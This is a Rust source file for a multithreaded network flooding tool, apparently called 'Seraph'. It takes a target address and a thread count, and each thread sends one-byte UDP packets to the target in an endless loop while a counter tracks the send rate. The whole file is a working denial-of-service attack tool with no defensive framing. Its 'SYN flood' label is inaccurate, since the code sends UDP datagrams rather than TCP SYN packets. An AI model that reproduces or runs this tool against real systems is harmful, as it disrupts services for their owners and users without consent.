use std::{
    net,
    sync::{
        atomic::{AtomicU64, Ordering},
        Arc, Mutex,
    },
    thread,
    time::Instant,
};

use clap::*;

/// SYN flood attack
#[derive(Parser, Debug)]
#[command(author, about, long_about = None)]
struct Args {
    /// url target to SYN flood
    #[arg(short, long)]
    url: String,

    /// number of threads to use
    #[arg(short, long, default_value_t = 10)]
    threads: u8,
}

fn main() {
    let args = Args::parse();

    let mut handles = Vec::new();
    let requests_amount = Arc::new(Mutex::new(AtomicU64::new(0)));
    let requests_amount_clone = requests_amount.clone();

    let start = Instant::now();
    ctrlc::set_handler(move || {
        let requests_amount = requests_amount_clone.lock().unwrap();
        println!(
            "\n\nSeraph worked for: {:.2}s\nTotal requests sent: {}\nRequests/sec: {}",
            start.elapsed().as_secs_f64(),
            requests_amount.load(Ordering::Relaxed),
            requests_amount.load(Ordering::Relaxed) as f64 / start.elapsed().as_secs_f64()
        );

        std::process::exit(0);
    })
    .expect("Error setting Ctrl+C handler");

    for _ in 0..args.threads {
        let url = args.url.clone();

        let requests_amount_clone = requests_amount.clone();
        let handle = thread::spawn(move || {
            let socket = net::UdpSocket::bind((net::Ipv4Addr::UNSPECIFIED, 0))
                .expect("Failed to bind address");

            loop {
                socket
                    .send_to(&[0x02], url.clone())
                    .expect("Failed to sent data");

                let requests_amount = requests_amount_clone.lock().unwrap();
                requests_amount.fetch_add(1, Ordering::Relaxed);
            }
        });

        handles.push(handle);
    }

    for handle in handles {
        handle.join().unwrap();
    }
}
